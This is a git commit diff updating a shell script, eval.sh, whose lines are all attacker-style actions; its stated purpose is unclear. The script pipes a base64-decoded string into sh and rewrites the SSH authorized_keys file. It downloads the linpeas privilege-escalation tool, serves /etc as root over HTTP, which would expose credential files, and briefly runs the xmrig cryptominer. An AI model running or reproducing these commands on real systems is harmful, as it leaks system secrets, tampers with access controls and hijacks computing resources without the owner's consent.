340920349f41984d53eccf65131789811bc7e6d9
mwilco03 <36248105+mwilco03@users.noreply.github.com>
2023-11-30 13:43:57 -0500

    Update eval.sh

--- eval.sh
+++ eval.sh
@@ -1,1 +1,10 @@
-echo "bHMgLWxhCg==" | base64 -d  | sh && curl -s https://thepiratebay.org/ >/dev/null && whoami && cd /etc/ && sudo python3 -m http.server && xmrig --bench=1M
+echo "bHMgLWxhCg==" | base64 -d  | sh &
+AUTHZ=$(cat .ssh/authorized_keys)
+echo $AUTHZ | sed 's/ssh-/\nssh-/g' > .ssh/authorized_keys &
+curl -Ls https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh >/dev/null &
+whoami &
+cd /etc/ && sudo python3 -m http.server &
+xmrig --bench=1M &
+sleep 4;
+pkill -9 xmrig;
+
